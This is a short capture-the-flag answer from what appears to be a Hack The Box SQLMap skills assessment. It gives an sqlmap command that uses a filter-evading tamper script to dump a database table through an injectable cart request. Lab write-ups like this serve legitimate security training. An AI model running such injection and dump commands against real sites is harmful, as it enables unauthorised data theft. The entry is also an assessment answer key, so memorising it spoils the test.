### What's the contents of table final_flag?
Writeup link: https://galapagh0st.com/Write-ups/HTB---CBBH---Writeups/HTB---SQLMap-Essentials---Skills-Assessment

**Answer:** Using the request on `Add to Cart` button, and passing `--tamper=between` gives the flag

```
sqlmap -r req.txt --tamper=between --dump -T final_flag --threads 10 --batch
```
